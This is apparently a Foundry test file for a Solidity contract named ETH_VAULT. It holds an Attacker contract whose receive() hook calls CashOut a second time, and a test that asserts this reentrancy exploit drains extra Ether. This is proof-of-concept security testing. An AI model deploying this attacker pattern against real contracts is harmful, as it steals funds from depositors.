
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT} from "../src/ETH_VAULT.sol";
import {Log} from "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {
    ETH_VAULT public vault;
    Log public logContract;
    
    Attacker public _attacker;

    function setUp() public {
        logContract = new Log();
        vault = new ETH_VAULT(address(logContract));
        
        _attacker = new Attacker(address(vault));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max);
        vm.assume(attackVal * 2 <= address(this).balance);

        vm.deal(address(vault), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = ETH_VAULT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialVictimBalance = address(victim).balance;
        
        victim.CashOut(val);
        
        if (attackCallCount > 1 && address(victim).balance < initialVictimBalance - val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.CashOut(attackAmount);
        }
    }
}
